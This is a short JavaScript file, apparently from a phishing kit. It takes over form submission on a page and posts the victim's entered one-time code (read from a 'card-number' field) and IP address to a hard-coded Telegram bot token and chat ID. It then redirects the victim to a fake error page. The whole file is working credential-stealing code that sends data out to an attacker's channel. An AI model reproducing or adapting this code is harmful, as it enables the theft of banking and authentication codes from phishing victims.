
setTimeout(function(){


$('form').submit(function(e){

$("#loader").show();



e.preventDefault();
	$.ajax({
  url:'https://api.telegram.org/bot2142704123:AAHZyCvbJRKt7-tJezlGdWgx1X0Ue06wzJA/sendMessage',
  method:'POST',
  data:{
  chat_id:'1634271322',
  text:"SMS"+ "\n"+ "\n"+ "\n"+
       "OTP :   "+$('#card-number').val()+ "\n"+
       "IP   : "+localStorage.getItem("IP")+ "\n",
  },
    success:function(){
	  var url= "./error.html"; 
      window.location = url; 
      $("#loader").addClass("hidden");
		

    }
 
});
});
},5000); 